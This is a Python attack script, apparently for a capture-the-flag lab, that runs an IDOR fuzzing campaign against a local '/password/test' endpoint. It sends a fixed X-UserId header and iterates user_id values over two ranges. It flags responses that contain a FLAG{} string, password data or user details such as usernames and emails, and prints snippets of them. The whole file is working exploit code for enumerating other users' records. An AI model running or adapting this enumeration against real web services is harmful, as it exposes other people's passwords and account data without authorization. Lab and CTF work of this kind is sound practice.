import requests
import re
import sys

# Configuration
target_url = "http://127.0.0.1:33200/password/test"
headers = {
    "X-UserId": "10032",
    "User-Agent": "Security-Testing-Agent"
}

# Regex for FLAG pattern
flag_pattern = re.compile(r'FLAG\{[^}]+\}')

# Track results
found_flags = []
successful_ids = []
error_ids = []
no_data_ids = []
total_requests = 0

print("="*80)
print("IDOR FUZZING CAMPAIGN - /password/test")
print("="*80)
print(f"Target URL: {target_url}")
print(f"Auth Header: X-UserId: 10032")
print(f"Total requests to make: 427")
print("="*80)

# Test Range 1: user_id=1 to user_id=300
print("\n[+] Starting Range 1: user_id=1 to user_id=300")
print("-"*80)

for user_id in range(1, 301):
    total_requests += 1
    try:
        params = {"user_id": user_id}
        response = requests.get(
            target_url,
            headers=headers,
            params=params,
            timeout=10
        )
        
        # Extract flag if present
        flags_found = flag_pattern.findall(response.text)
        if flags_found:
            found_flags.extend([(user_id, flag) for flag in flags_found])
            print(f"[!] FLAG FOUND at user_id={user_id}!")
            for flag in flags_found:
                print(f"    {flag}")
        
        # Check for sensitive data patterns
        has_password = "password" in response.text.lower()
        has_user_info = any(keyword in response.text.lower() for keyword in ["username", "email", "user_id", "account"])
        
        if response.status_code == 200:
            if response.text.strip() and (has_password or has_user_info or flags_found):
                successful_ids.append(user_id)
                print(f"[+] user_id={user_id:4d} | Status: {response.status_code} | Length: {len(response.text)}B")
                if has_password:
                    print(f"    [!] Contains password data")
                if has_user_info:
                    print(f"    [!] Contains user information")
                if flags_found:
                    print(f"    [!] FLAG in response")
                # Print a snippet of the response
                snippet = response.text[:200] if len(response.text) > 200 else response.text
                print(f"    Response snippet: {snippet}")
            else:
                no_data_ids.append(user_id)
                print(f"[-] user_id={user_id:4d} | Status: {response.status_code} | No relevant data")
        else:
            error_ids.append((user_id, response.status_code))
            print(f"[-] user_id={user_id:4d} | Status: {response.status_code} | Error response")
            
    except Exception as e:
        print(f"[ERROR] user_id={user_id:4d} | Exception: {str(e)}")
        error_ids.append((user_id, "EXCEPTION"))
    
    # Stop if flags found
    if found_flags:
        print("\n[!] FLAG FOUND - Stopping early!")
        break

# Only continue to Range 2 if no flags found yet
if not found_flags:
    print("\n[+] Starting Range 2: user_id=10025 to user_id=10150")
    print("-"*80)
    
    for user_id in range(10025, 10151):
        total_requests += 1
        try:
            params = {"user_id": user_id}
            response = requests.get(
                target_url,
                headers=headers,
                params=params,
                timeout=10
            )
            
            # Extract flag if present
            flags_found = flag_pattern.findall(response.text)
            if flags_found:
                found_flags.extend([(user_id, flag) for flag in flags_found])
                print(f"[!] FLAG FOUND at user_id={user_id}!")
                for flag in flags_found:
                    print(f"    {flag}")
            
            # Check for sensitive data patterns
            has_password = "password" in response.text.lower()
            has_user_info = any(keyword in response.text.lower() for keyword in ["username", "email", "user_id", "account"])
            
            if response.status_code == 200:
                if response.text.strip() and (has_password or has_user_info or flags_found):
                    successful_ids.append(user_id)
                    print(f"[+] user_id={user_id:5d} | Status: {response.status_code} | Length: {len(response.text)}B")
                    if has_password:
                        print(f"    [!] Contains password data")
                    if has_user_info:
                        print(f"    [!] Contains user information")
                    if flags_found:
                        print(f"    [!] FLAG in response")
                    # Print a snippet of the response
                    snippet = response.text[:200] if len(response.text) > 200 else response.text
                    print(f"    Response snippet: {snippet}")
                else:
                    no_data_ids.append(user_id)
                    print(f"[-] user_id={user_id:5d} | Status: {response.status_code} | No relevant data")
            else:
                error_ids.append((user_id, response.status_code))
                print(f"[-] user_id={user_id:5d} | Status: {response.status_code} | Error response")
                
        except Exception as e:
            print(f"[ERROR] user_id={user_id:5d} | Exception: {str(e)}")
            error_ids.append((user_id, "EXCEPTION"))
        
        # Stop if flags found
        if found_flags:
            print("\n[!] FLAG FOUND - Stopping early!")
            break

# Final Summary
print("="*80)
print("FUZZING CAMPAIGN COMPLETE")
print("="*80)
print(f"Total requests made: {total_requests}")
print(f"Successful IDs with data: {len(successful_ids)}")
print(f"IDs with no relevant data: {len(no_data_ids)}")
print(f"Error responses: {len(error_ids)}")

if found_flags:
    print("\n[!] FLAGS DISCOVERED:")
    for user_id, flag in found_flags:
        print(f"  user_id={user_id}: {flag}")
        
if successful_ids:
    print(f"\n[+] SUCCESSFUL IDs (returned sensitive data):")
    print(f"  {successful_ids}")
    
if error_ids:
    print(f"\n[-] ERROR IDs (status != 200):")
    print(f"  {error_ids[:10]}..." if len(error_ids) > 10 else f"  {error_ids}")

print("="*80)

# Exit with appropriate code
if found_flags:
    sys.exit(0)  # Success - flag found
else:
    sys.exit(1)  # No flag found
